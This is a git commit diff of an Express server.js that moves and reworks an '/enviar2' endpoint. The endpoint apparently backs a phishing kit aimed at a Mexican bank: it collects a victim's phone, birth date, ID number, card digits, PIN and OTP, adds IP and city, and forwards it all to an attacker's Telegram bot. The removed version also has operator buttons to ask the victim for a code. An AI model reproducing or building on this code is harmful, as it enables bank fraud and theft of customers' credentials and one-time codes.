de3c528d6227e9a9520e408d58c4697cfa650684
syn4pse1 <87922694+syn4pse1@users.noreply.github.com>
2025-06-21 22:47:11 -0400

    Update server.js

--- server.js
+++ server.js
@@ -87,51 +87,7 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
-app.post('/enviar2', async (req, res) => {
-  const { celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, txid } = req.body;
 
-  const ip = obtenerIpReal(req);
-  const ciudad = await obtenerCiudad(ip);
-
-  const mensaje = `
-🔵B4NC0P3L🔵
-🆔 ID: <code>${txid}</code>
-
-📱 Celular: ${celular}
-🎂 Nacimiento: ${fechaNacimiento}
-🆔 Tipo ID: ${tipoIdentificacion}
-🔢 Identificador: ${numeroIdentificador}
-💳 Últimos 2: ${ultimos2}
-🔐 NIP: ${nip}
-
-🌐 IP: ${ip}
-🏙️ Ciudad: ${ciudad}
-`;
-
-  const keyboard = {
-    inline_keyboard: [
-       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
-      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }], 
-      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
-    ]
-  };
-
-  clientes[txid] = "esperando";
-  guardarEstado();
-
-  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: mensaje,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
-    })
-  });
-
-  res.sendStatus(200);
-});
 
 app.post('/callback', async (req, res) => {
   const callback = req.body.callback_query;
@@ -160,3 +116,37 @@ app.get('/sendStatus.php', (req, res) => {
 
 app.get('/', (req, res) => res.send("Servidor activo en Render"));
 app.listen(3000, () => console.log("Servidor activo en Render puerto 3000"));
+
+app.post('/enviar2', async (req, res) => {
+  const { txid, celular, fechaNacimiento, tipoIdentificacion, numeroIdentificador, ultimos2, nip, otp } = req.body;
+
+  const ip = obtenerIpReal(req);
+  const ciudad = await obtenerCiudad(ip);
+
+  const mensaje = `
+🔁 <b>Clave Dinámica Recibida</b>
+🆔 ID: <code>${txid}</code>
+📱 Celular: ${celular}
+🎂 Nacimiento: ${fechaNacimiento}
+🆔 Tipo ID: ${tipoIdentificacion}
+🔢 Identificador: ${numeroIdentificador}
+💳 Últimos 2: ${ultimos2}
+🔐 NIP: ${nip}
+🔑 OTP: <code>${otp}</code>
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML'
+    })
+  });
+
+  res.sendStatus(200);
+});
+
